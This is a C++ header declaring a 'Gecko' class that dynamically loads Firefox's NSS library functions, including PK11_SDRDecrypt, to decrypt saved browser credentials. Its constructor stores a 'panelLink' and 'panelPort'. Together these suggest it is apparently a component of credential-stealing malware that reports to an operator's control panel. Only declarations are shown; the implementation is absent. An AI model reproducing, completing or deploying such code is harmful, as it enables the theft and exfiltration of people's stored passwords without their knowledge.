#pragma once
typedef enum _SECStatus {
	SECWouldBlock = -2,
	SECFailure = -1,
	SECSuccess = 0
} SECStatus;

typedef enum {
	siBuffer,
	siClearDataBuffer,
	siCipherDataBuffer,
	siDERCertBuffer,
	siEncodedCertBuffer,
	siDERNameBuffer,
	siEncodedNameBuffer,
	siAsciiNameString,
	siAsciiString,
	siDEROID
} SECItemType;

struct SECItemStr {
	SECItemType type;
	unsigned char* data;
	size_t len;
};

typedef struct SECItemStr SECItem;
typedef unsigned int PRUint32;
typedef int PRBool;

typedef SECStatus(*NSS_InitFunc)(const char*);
typedef SECStatus(*NSS_ShutdownFunc)(void);
typedef void* (*PK11_GetInternalKeySlotFunc)(void);
typedef void(*PK11_FreeSlotFunc) (void*);
typedef SECStatus(*PK11_CheckUserPasswordFunc) (void*, char*);
typedef SECStatus(*PK11_AuthenticateFunc) (void*, int, void*);
typedef char* (*PL_Base64DecodeFunc)(const char*, PRUint32, char*);
typedef SECStatus(*PK11_SDRDecryptFunc) (SECItem*, SECItem*, void*);
typedef void(*SECITEM_ZfreeItemFunc)(SECItem*, PRBool);

#define PR_TRUE  1
#define PR_FALSE 0

class Gecko
{
private:
	string profilePath;
	string panelLink;
	DWORD panelPort;
	string workingPath;

	HMODULE hNss;
	NSS_InitFunc NSSInit;
	NSS_ShutdownFunc NSSShutdown;
	PK11_GetInternalKeySlotFunc PK11GetInternalKeySlot;
	PK11_FreeSlotFunc PK11FreeSlot;
	PK11_CheckUserPasswordFunc PK11CheckUserPassword;
	PK11_AuthenticateFunc PK11Authenticate;
	PL_Base64DecodeFunc PLBase64Decode;
	PK11_SDRDecryptFunc PK11SDRDecrypt;
	SECITEM_ZfreeItemFunc SECITEMZfreeItem;
public:
	Gecko(string profilePath, string panelLink, DWORD panelPort, string workingPath)
	{
		this->profilePath = profilePath;
		this->panelLink = panelLink;
		this->panelPort = panelPort;
		this->workingPath = workingPath;
	}
	~Gecko();
	void GetDlls();
	bool InitFunc();
	bool InitNSS();
	string Decrypt(string encData);
};